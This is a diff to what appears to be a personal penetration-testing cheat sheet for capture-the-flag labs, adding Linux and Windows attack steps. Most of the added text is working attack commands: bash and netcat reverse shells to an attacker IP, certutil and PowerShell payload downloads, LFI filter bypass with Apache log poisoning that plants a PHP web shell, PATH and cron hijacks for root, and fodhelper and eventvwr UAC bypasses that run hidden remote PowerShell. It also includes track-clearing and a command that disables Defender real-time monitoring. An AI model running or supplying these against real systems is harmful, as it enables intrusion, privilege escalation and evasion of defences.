@@ -45,8 +45,13 @@ xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-si
 ```
 Enter the password when prompted.
 
+## ==🔵Transfer `nc.exe` to windows : ==
+
 Transfer `nc.exe` to windows and get a reverse shell : 
 Download 64 bit netcat : 
+```
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+```
 if required then download 32 bit x86 netcat
 ```
 https://github.com/int0x33/nc.exe/
@@ -160,20 +165,11 @@ icacls .
 ```
 switch folders until you get look for  W (Write-only access)* , M (Modify access), F (Full access)
 
-switch to temp folder 
-```
-cd C:\Temp
-```
-
-switch to users 
-```
-cd C:\
-dir
-icacls .
-```
-switch to public 
+switch to these folders and try : 
 ```
 cd C:\Users\Public
+cd C:\Windows\Tasks
+cd C:\Temp
 ```
 
 ----
@@ -187,10 +183,11 @@ python3 -m http.server 8000
 
 Windows get file : 
 CMD (1st priority) : 
+`certutil` by default uses port 80 , if python server is on another port , you have to mention it in the `certutil` command
 ```
 certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
 or 
-certutil.exe -urlcache -split -f http://10.150.72.11/shell.exe shell.exe
+certutil.exe -urlcache -split -f http://10.150.72.11:8000/shell.exe shell.exe
 ```
 PowerShell : 
 ```
@@ -250,7 +247,7 @@ scp -r "C:\temp\Active Directory" kali@<KALI_IP>:/home/kali/Downloads/
 ```
 1. Spaces in the folder name: `Active Directory` must be enclosed in quotes.
 2. Copying a directory: use `-r` to copy a directory recursively.
-### ==🔵Windows (AD -authenticated SMB share) → Kali Linux==
+### ==🔵Windows (AD - authenticated SMB share) → Kali Linux==
 
 #### On Kali
 
@@ -334,6 +331,12 @@ nc -lvnp 4444 > filename           # receiver
 ```
 rlwrap -cAr nc -lvnp 4444
 ```
+
+==🔵Bash : ==
+```
+sh -i >& /dev/tcp/<kali ip>/4444 0>&1
+```
+
 
 ==🔵if we didn't wanted a call back to our listener using a reverse shell<br>we could have gotten system in same shell as well==
 ```
@@ -580,12 +583,13 @@ Nmap
 ```
 sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
 ```
+ALWAYS RUN TWICE TO CONFIRM
 
 When the TCP scan finishes, immediately run a UDP scan.
 ```
-sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
+sudo nmap -Pn -n -sU --top-ports=100 --reason <IP>
 ```
-## ==🟢Web Application ==
+## ==🟢Web Application (see if any port has http open) ==
 ##### ==🔵Directory brute forcing : ==
 
 Quick initial scan : 
@@ -646,6 +650,7 @@ Keep checking the URL bar if it's suspicious for LFI
 `view=`
 `page=`
 try to go one directory back one by one to see till where last it allows you
+###### ==🟢Discovery Method 1 : 
 
 Download wordlist : 
 [Payloads list](LFI%20payloads.txt)
@@ -684,18 +689,87 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 ```
 see if it has the `Mozilla/5.0 ...` — the User-Agent header sent by the browser.
 
-Now Verify whether your User-Agent is logged
-In Kali, send a harmless, unique marker to the lab:
-```
-curl -A 'LabMarker-8472' http://mafialive.thm/
-```
-Then reload your already-working `access.log` URL in the browser and search the displayed content for:
-```
-LabMarker-8472
-```
-If you find it, you've verified that your chosen header is being recorded in the access log.
+###### ==🟢Discovery Method 2 : 
 
+Access the content of `test.php` using PHP wrappers. This allows us to view the script source, where we discovered another flag and a code vulnerability:
+```
+test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+```
+so in url bar we have :
+replace the parameters of `view=` or the `test.php` carefully
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+```
 
+Decode the base64 code ; or use cyberchef to see what encoding is there
+```
+echo “<code_from_the_page>” | base64 -d
+```
+
+Understand the code : 
+
+Condition A: Block a particular traversal string
+```
+!containsStr($_GET['view'], '../..')
+```
+The `!` means NOT. This condition passes only if the parameter does not contain the literal substring `../..`
+
+The `&&` operator means both conditions must be true.
+
+Condition B: Require a specific directory string
+```
+containsStr(
+    $_GET['view'],
+    '/var/www/html/development_testing'
+)
+```
+The parameter must contain the specified directory path somewhere in the string.
+
+Work-around :
+The filter only blocks paths containing "**../..**" but allows other traversal sequences like "**..//..//**", and it only checks if the path contains the string "**/var/www/html/development_testing**", which can be bypassed by cleverly crafting the path to include that substring along with traversal sequences.
+With this knowledge, attempt once again to read the **"/etc/passwd"** file
+
+###### ==🟢Log poisoning :== 
+
+now go to https://www.revshells.com/ to make revere shell of php pentest monkey
+copy and paste in 
+```
+nano shell.php
+```
+start listener in another terminal
+```
+rlwrap -cAr nc -lvnp 4444
+```
+start python server in another terminal :
+```
+python -m http.server 80
+```
+
+inject a full PHP web shell by poisoning the Apache access log. Using **curl**, we sent a request to the target server with a malicious **User-Agent** header that would attempt to download and write a web shell from our controlled server:
+```
+curl -s http://mafialive.thm -A "<?php file_put_contents('shell.php', file_get_contents('http://<YOUR_MACHINE_IP>/shell.php'))?>"
+```
+
+now read the log file again in browser
+refresh the log file page
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..///var/log/apache2/access.log  
+```
+now in browser access the shell to execute it :
+```
+http://mafialive.thm/shell.php
+```
+
+we get reverse shell back
+now stabalise the shell :
+enter 1 by 1
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo
+fg
+export TERM=xterm
+```
 
 ##### ==🔵If it's a CMS : ==
 
@@ -810,7 +884,7 @@ after that , upload `PHP Ivan Sincek` revershell to the website
 
 ## ==🟢Services : ==
 
-#### ==🔵SMB==
+#### ==🔵SMB (Port 139/445)==
 
 Access Anonymous SMB Shares :
 ```
@@ -948,6 +1022,25 @@ save                                       # to save the file now
 
 ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
 ```
+#### ==🔵Other Services :== 
+
+###### ==🔵Icecast==
+
+```
+8000/tcp  open  http         Icecast streaming media server
+```
+
+check if `RPORT` is set correctly as per service or not
+```
+msfconsole
+search icecast
+msf > use 0
+show options
+set RHOSTS 10.48.173.202
+set LHOST 192.168.142.71
+run
+shell
+```
 
 
 # ==🟣Linux Privilege Escalation==
@@ -957,13 +1050,13 @@ Linpeas :
 https://github.com/peass-ng/PEASS-ng/releases
 ```
 download "linpeas.sh"
-##### General : 
+
 Linux has `tmp` folder , which is world writeable
 ```
 cd /tmp
 ```
 
-GTFO Bins Wayback : https://web.archive.org/web/20260102075820/https://gtfobins.github.io/#view
+GTFO Bins Wayback : [Link](https://web.archive.org/web/20260102075820/https://gtfobins.github.io/#view)
 
 Find Flag 
 ```
@@ -1093,7 +1186,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
 ### ==🔵SUID Executables : ==
-###### ==🔵Known exploits : ==
+##### ==🔵Known exploits : ==
 Find all the SUID/SGID executables on the Debian VM
 ```
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -1104,7 +1197,51 @@ find / -user root -perm /4000 2>/dev/null
 ```
 Find known exploit for `versions` found of executables on searchsploit , Google, and GitHub
 or go to gtfo bins 
-###### ==🔵SUID shared object (.so) injection : ==
+
+Find un-comon custom binaries 
+for ex. in the `/home` folder : 
+go to that directory and see what it is
+###### ==🔵Ex. Backup : (Binary without a path / unquoted path)==
+
+ex. `/home/archangel/secret/backup`
+
+see all the strings present in the `backup` file
+```
+strings /home/archangel/secret/backup
+```
+we find this string in there:
+```
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+```
+we notice that the full path of the `cp` binary is not mentioned
+or unquoted
+
+so we create our own version of `cp` and then put it in `/tmp` folder and then add the `/tmp` folder to our path so our own `cp` gets executed
+
+```
+cd /tmp
+echo "/bin/bash" >> cp
+chmod +x cp
+export PATH=/tmp:$PATH
+./backup
+```
+
+we get root shell
+```
+root@ubuntu:#
+```
+
+alternatively , you could have also added a reverse shell on another port
+now , create our own `cp` binary in the `/tmp` with a reverse shell in it 
+```
+echo "sh -i >& /dev/tcp/<kali ip>/4444 0>&1" > /tmp/cp
+```
+start listener in another terminal :
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+##### ==🔵SUID shared object (.so) injection : ==
 find a `-so` executables
 then run this to check the files its asking for but not available 
 ```
@@ -1139,7 +1276,7 @@ now again run the initial executable
 /usr/local/bin/suid-so
 # run directly , you will get a root shell now
 ```
-###### ==🔵Environment Variables (without absolute service path) : ==
+##### ==🔵Environment Variables (without absolute service path) : ==
 find if you have any env files : `/usr/local/bin/suid-env`
 Find what it executes : `strings /usr/local/bin/suid-env`
 see if it starts any service without proving the full path
@@ -1172,26 +1309,35 @@ Environment Variables (without absolute service path) : will work only for bash 
 ### ==🔵Cron tabs :==
 
 Go to `crontab.guru` website and enter cron tab to see what it means
-`*/5` - at every 5th minute
+`*/2` - at every 2nd minute
+`minute ; hour ; day of month ; month ; day of week`
 ex. `* * * * * kali /bin/bash /home/kali/Downloads/code/code.sh`
 add user name and shell also
 ###### ==🔵Weak File Permissions : ==
-minute ; hour ; day of month ; month ; day of week
-```
+
 1. View System-wide crontab : cat /etc/crontab
-2. check if path is writeable : la -la "full path to script"
-3. locate <filename>
-```
+2. see which user is executing it
+3. check if path is writeable : la -la "full path to script"
+4. locate `<filename>`
+
 ==🔵replace content of file with : ==
-IMPORTANT : This line should be in starting "#!/bin/bash"
+
+```
+echo "sh -i >& /dev/tcp/<kali ip>/4444 0>&1" >> /opt/helloworld.sh
+# sh -i >& /dev/tcp/<kali ip>/4444 0>&1
+# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
+```
+`>>` - to append
+`>` - to replace
+
+IMPORTANT : This script should be in starting "#!/bin/bash"
 ```
 #!/bin/bash
 <put bash reverse shell>
-# bash -i >& /dev/tcp/<kali ip>/4444 0>&1
 ```
 and start listener on kali
 ```
-nc -nvlp 4444
+rlwrap -cAr nc -lvnp 4444
 ```
 
 ###### ==🔵PATH Manipulation : ==
@@ -1558,12 +1704,17 @@ openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
 
 #### ==🔵Methodology : ==
 
+First run
+```
+whoami /all
+```
+if you are in administrators group but have medium integrity level , do UAC bypass
+
+then PrivEscCheck, then PowerUp, then WinPEAS.
+
 - Quick check C:\ drive for non default folders.
 - `tree /F /A .` on C:/Users/ directory, look for suspicious files.
 - Quick check Program Files to find non default Software
-- Run `whoami /all`, then PrivEscCheck, then PowerUp, then WinPEAS.
-- The above will give you all info you need. Save output and slowly go over it.
-- If you get completely stuck, you can manually check for things too.
 #### ==🔵General : ==
 
 Find Flag 
@@ -1611,46 +1762,6 @@ Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalati
 ==🔵If in powershell you are unable to execute scripts : ==
 ```
 powershell -executionpolicy bypass
-```
-###### ==🔵To connect to RDP : ==
-
-BLACK SCREEN : lower mtu to 1000
-```
-xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
-```
-or
-When it isn't connecting : 
-```
-xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
-```
-or 
-```
-xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
-```
-Enter the password when prompted.
-
-Transfer `nc.exe` to windows and get a reverse shell : 
-Download 64 bit netcat : 
-if required then download 32 bit x86 netcat
-```
-https://github.com/int0x33/nc.exe/
-```
-start python server : 
-```
-python3 -m http.server 8000
-```
-download on windows :
-```
-powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
-```
-to get shell back from windows to kali : 
-start a listener on Kali:
-```
-rlwrap -f . nc -lvnp 4444
-```
-windows command to get reverse shell of cmd : 
-```
-nc.exe -e cmd.exe <kali ip> 4444
 ```
 
 ##### ==🔵Basic Manual enumeration : ==
@@ -1767,11 +1878,37 @@ Download `winPEASx64.exe` :
 https://github.com/peass-ng/PEASS-ng/releases/tag/20260922-7b7c14db
 ```
 transfer to windows
+```
+python3 -m http.server 8000
+```
+
+```
+certutil -f -urlcache http://192.168.142.71:8000/winPEASx64.exe "winPEASx64.exe"
+```
+
 run : 
 ```
 .\winPEASx64.exe > windows.txt
 ```
-we'll run winpeas and transfer our file back to kali to analyze more properly
+If error in shell :
+Check whether winPEAS is still running
+```
+tasklist | findstr /i winpeas
+```
+keep it running if the file size in increasing
+
+transfer back to kali : 
+On Kali start SMB server : 
+```
+impacket-smbserver share . 
+# if error - wants smb2 : 
+impacket-smbserver share . -smb2support
+```
+On windows transfer files : 
+```
+copy <input file name> \\<kali ip>\share\<output file name>
+# ex. copy windows.txt \\192.168.131.128\share\windows.txt
+```
 
 For searching a specific thing in winpeas : 
 ```
@@ -1783,7 +1920,7 @@ grep -aiA 10 "putty" windows.txt
 
 if found creds in putty , login using ssh
 
-### ==🔵Service Abuse : ==
+### ==🟢Service Abuse : ==
 
 ###### Windows Service Enumeration : 
 
@@ -2154,7 +2291,7 @@ sc start <service_name>
 sc stop <service_name>
 ```
 
-### ==🔵Sensitive Credentials==
+### ==🟢Sensitive Credentials==
 
 ###### ==🔵Unattended Windows Installations==
 
@@ -2280,7 +2417,7 @@ john will automatically identify the hashing algorithm
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
 ```
 You can use the cracked password to log in as the admin using winexe or RDP.
-### ==🔵Registry Attacks==
+### ==🟢Registry Attacks==
 
 Windows Registry = A shared database where Windows stores configuration settings.
 ###### ==🔵Autorun==
@@ -2396,7 +2533,7 @@ run the msi
 # msiexec /quiet /qn /i C:\PrivEsc\reverse.msi ; if 1st one doesnt work
 ```
 well get a reverse shell back 
-### ==🔵Privilege Attacks==
+### ==🟢Privilege Attacks==
 
 ###### ==🔵to check current privileges==
 ```
@@ -2621,7 +2758,7 @@ we get admin hash
 Format: RID : LM hash : NT hash
 ```
 
-### ==🔵Other Windows Components==
+### ==🟢Other Windows Components==
 
 #### ==🔵Kernel Exploitation ==
 
@@ -2891,10 +3028,18 @@ first go to File > Open Windows PowerShell > frequent places : desktop
 then again come back and repeat : 
 you will get option to "open windows PowerShell as administrator"
 
-#### ==🔵Windows UAC Bypass (Admin Medium to High Integrity)==
+#### ==🔵Windows UAC Bypass ( If Already Admin : Medium to High Integrity)==
+
+if `whoami /all` shows :
+```
+Enabled group
+BUILTIN\Administrators
+
+Mandatory Label\Medium Mandatory Level Label
+```
+##### About : 
 
 Admin Medium to High Integrity privilege escalation : 
-
 Conditions : 
 1. UAC is enabled
 2. User is already in administrators group
@@ -2909,44 +3054,116 @@ dimmed)
 5 – Default (notify when apps make changes, not me)
 ```
 
-
 now we have to check if UAC is enabled or not 
 ```
 reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 ```
 we can see its value is 5 i.e (0x5)
+##### ==🔵Method 1 : eventvwr.exe==
 
-##### Method 1 : msconfig (GUI ACCESS REQUIRED) :
-
-from apps search `msconfig` and open `system configuration`
-go to
-tools > command prompt > launch 
-a cmd will open with admin and high integrity level 
-
-##### Method 2 : Authorization Manager (azman) (GUI ACCESS REQUIRED)
-
-press : windows + R or search for `run` in apps
-type : 
+Check if auto elevate is linked to this particular executable:
 ```
-azman.msc
+powershell -C Get-Content -Path C:\Windows\System32\eventvwr.exe | findstr /i "autoElevate"
+```
+press enter , it should return : `<autoElevate>true</autoElevate>`
+If yes , next : 
+
+Next, switch to cmd.exe for these registry settings :
+```
+REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command
+
+REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ
 ```
 
-go to help > help topics 
-right click in middle 
-go to view source 
-
-notepad will open 
-now click 
-file > open 
-
-In the open file dialog box, click in the navigation input and paste: 
-type the full path shown on top of file system 
+place `netcat` in this folder first (or of your choice and then change location in next command also) : 
 ```
-C:\Windows\System32\cmd.exe
+c:\windows\tasks\nc.exe
 ```
-press enter 
-it will open a admin cmd with high integrity level 
-##### Method 3 : fodhelper (NO GUI required , ONLY CMD REQUIRED)
+
+CHANGE KALI IP HERE :
+```
+REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "c:\windows\tasks\nc.exe -nv 192.168.142.71 445 -e cmd.exe" /f
+```
+
+now back on kali :
+```
+rlwrap nc -lnvp 445
+```
+
+in windows , run :
+```
+eventvwr
+```
+
+NOTE : IF `nc.exe` doesn't work then try `nc64.exe`
+
+----
+
+```
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\robert\downloads\work2\obfuscated.ps1" -Force
+```
+
+##### ==🔵Method 2 : fodhelper.exe==
+
+first check if the binary even exists
+Check if auto elevate is linked to this particular executable:
+```
+powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /i "autoElevate"
+```
+IF THIS COMMAND SHOWS ERROR , THEN THIS BINARY IS NOT PRESENT , SWITCH TO ANOTHER METHOD
+
+Next, switch to cmd.exe for these registry settings
+Now we set some registry keys to abuse this weaknesses and use it's autoelevate and it's high integrity level to escalate our privileges:
+
+CHANGE KALI IP HERE IN SECOND COMMAND
+```
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+set CMD="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing https://8bgmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)"
+
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+
+reg add %REG_KEY% /d %CMD% /f
+```
+
+Time to start a listener and get high privileged integrity level:
+on kali : 
+```
+rlwrap nc -lnvp 443
+```
+on windows , run :
+```
+fodhelper.exe
+```
+
+----
+
+Clearing our tracks:
+```
+reg delete HKCU\Software\Classes\ms-settings\ /f
+```
+
+Works in PowerShell memory
+```
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass C:\users\ryan\desktop\ninja22.ps1" -Force
+
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+Turn off AV
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+----
+
+```
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing https://8bgmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)" -Force
+```
+
+##### ==🔵Method 3 : fodhelper (NO GUI required , ONLY CMD REQUIRED)==
 
 we start another reverse shell listener in another terminal 
 so we get a shell from our initial rev shell 
@@ -2959,9 +3176,14 @@ we save the reg key in environment variable so we don't have to set it again and
 set REG_KEY="HKCU\Software\Classes\ms-settings\Shell\Open\command"
 ```
 
+DOWNLOAD NETCAT TO THAT WINDOWS MACHINE FIRST
+```
+certutil -f -urlcache http://192.168.142.71:8000/nc64.exe "nc64.exe"
+```
+
 set variable as well 
 ```
-set CMD="C:\Users\admin\nc64.exe -e cmd.exe 192.168.163.199 4444"
+set CMD="C:\Users\public\nc64.exe -e cmd.exe 192.168.142.71 4444"
 ```
 
 now we need to reference environment variable 
@@ -2993,6 +3215,36 @@ which has our malicious command
 
 in our additional listener , 
 we get rev shell back with high integrity level
+##### Method 4 : msconfig (GUI ACCESS REQUIRED) :
+
+from apps search `msconfig` and open `system configuration`
+go to
+tools > command prompt > launch 
+a cmd will open with admin and high integrity level 
+
+##### Method 5 : Authorization Manager (azman) (GUI ACCESS REQUIRED)
+
+press : windows + R or search for `run` in apps
+type : 
+```
+azman.msc
+```
+
+go to help > help topics 
+right click in middle 
+go to view source 
+
+notepad will open 
+now click 
+file > open 
+
+In the open file dialog box, click in the navigation input and paste: 
+type the full path shown on top of file system 
+```
+C:\Windows\System32\cmd.exe
+```
+press enter 
+it will open a admin cmd with high integrity level 
 
 #### ==🔵Vulnerable Software==
 
